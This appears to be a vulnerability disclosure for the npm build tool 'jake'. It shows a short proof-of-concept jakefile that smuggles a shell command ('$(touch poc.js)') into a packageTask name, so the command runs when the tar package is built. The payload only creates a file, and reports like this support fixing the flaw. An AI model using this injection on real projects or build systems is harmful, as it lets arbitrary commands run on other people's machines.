# Description

`jake` is vulnerable to `Command Injection vulnerability`. It allows attackers to execute arbitrary OS commands.

# Proof of Concept

1. Create the following PoC file as `jakefile.js`:
```javascript
const { packageTask } = require('jake');

const command = "$(touch poc.js)";

package = new packageTask(command, 'v1.0');
package.needTar = true;
package.define();
```

2. Execute the following commands:
```shell
npm i -g jake;
jake package -f jakefile.js;
```

3. Check the Output:

Look inside the `pkg` directory created and check that has a `poc.js` file.
